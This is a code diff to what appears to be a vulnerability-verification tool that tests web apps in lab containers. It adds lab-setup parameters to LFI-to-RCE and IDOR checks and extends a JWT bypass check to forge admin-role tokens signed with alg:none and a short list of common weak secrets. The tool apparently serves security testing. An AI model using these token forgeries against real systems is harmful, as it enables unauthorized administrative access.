@@ -1586,6 +1586,7 @@ def verify_generic_lfi_rce(
     source_dir: str, endpoint: str, http_method: str, parameters,
     path_param_hint: str = "", on_step: Optional[Callable[[str], None]] = None,
     budget_s: float = 900.0,
+    dockerfile_body: str = "", extra_files: Optional[dict] = None,
 ) -> WpVerifyResult:
     """LFI-a-RCE por envenenamiento de log (log poisoning), una tecnica MAS AVANZADA y distinta
     de path traversal (que solo LEE un fichero): si el parametro vulnerable se usa para un
@@ -1623,7 +1624,8 @@ def verify_generic_lfi_rce(
                                    "(path_param_hint)")
             return res
 
-    boot = _bootstrap_generic_lab(source_dir, step, res, budget_s)
+    boot = _bootstrap_generic_lab(source_dir, step, res, budget_s,
+                                   dockerfile_body=dockerfile_body, extra_files=extra_files)
     if boot is None:
         return res
     lab, base_url, container = boot
@@ -1738,6 +1740,7 @@ def verify_generic_idor(
     source_dir: str, endpoint: str, http_method: str, parameters,
     id_param_hint: str = "", own_id: str = "1", victim_id: str = "2",
     on_step: Optional[Callable[[str], None]] = None, budget_s: float = 900.0,
+    dockerfile_body: str = "", extra_files: Optional[dict] = None,
 ) -> WpVerifyResult:
     """Version DELIBERADAMENTE MAS DEBIL del IDOR que verify_wordpress_account_takeover y
     similares confirman en WordPress/Drupal/Joomla: aqui NO hay ningun flujo de login generico
@@ -1766,7 +1769,8 @@ def verify_generic_idor(
                                "(id_param_hint)")
         return res
 
-    boot = _bootstrap_generic_lab(source_dir, step, res, budget_s)
+    boot = _bootstrap_generic_lab(source_dir, step, res, budget_s,
+                                   dockerfile_body=dockerfile_body, extra_files=extra_files)
     if boot is None:
         return res
     lab, base_url, container = boot
@@ -4385,9 +4389,14 @@ def verify_generic_jwt_bypass(
         token_id = _token()
         payload_data = {"sub": f"admin-{token_id}", "role": "admin", "iat": 1700000000, "exp": 9999999999}
 
+        _weak_secrets = ["secret", "password", "changeme", "123456", "jwt", ""]
+        if weak_secret and weak_secret not in _weak_secrets:
+            _weak_secrets.insert(0, weak_secret)
+        _weak_attempts = [(f"weak-secret ({s!r})", _make_jwt_weak(payload_data, s))
+                          for s in _weak_secrets if s != ""]
         for label, jwt_token in [
             ("alg:none bypass", _make_jwt_none(payload_data)),
-            (f"weak-secret ({weak_secret!r})", _make_jwt_weak(payload_data, weak_secret)),
+            *_weak_attempts,
         ]:
             step(f"JWT bypass: probando {label} contra {endpoint}")
             hdrs = {"Authorization": f"Bearer {jwt_token}",
